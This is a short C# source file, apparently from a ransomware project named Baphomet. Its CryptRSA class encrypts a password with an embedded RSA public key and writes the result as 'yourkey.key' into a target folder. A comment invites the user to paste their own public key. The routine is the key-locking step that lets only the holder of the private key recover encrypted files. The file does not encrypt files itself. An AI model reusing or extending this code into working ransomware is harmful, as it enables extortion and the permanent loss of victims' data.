using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class CryptRSA
    {
        public  void EncryptText(string targetPath ,string password)
        {
            //Pega tu llave publica aqui! / Paste your public key here!
            string publicKey = "<RSAKeyValue><Modulus>qSxpOSGIDFwewDK9Rar0DPgApZTiRBRPX0no3HluOWZQ0wS49KtNYX/u6SuJKLwSVO8riCIPEo4mvCGaTFwGmO8cnYtjd0h+/jILWfw5I7RudxWnoqdJ/ORd0wT1Inhekd+DWfxa5f/gJf6eRAyxIW6MEARE3QIQDa8f+Tp8BAE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            // Convierto el password a un array byte 
            UnicodeEncoding byteConverter = new UnicodeEncoding();
            byte[] dataToEncrypt = byteConverter.GetBytes(password);

            // Creo un array byte para almazenar la data encriptada(password)  
            byte[] encryptedData;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                // Set rsa pulic key   
                rsa.FromXmlString(publicKey);

                encryptedData = rsa.Encrypt(dataToEncrypt, false);
            }
             File.WriteAllBytes(targetPath + "\\yourkey.key", encryptedData);
        }
    }
}
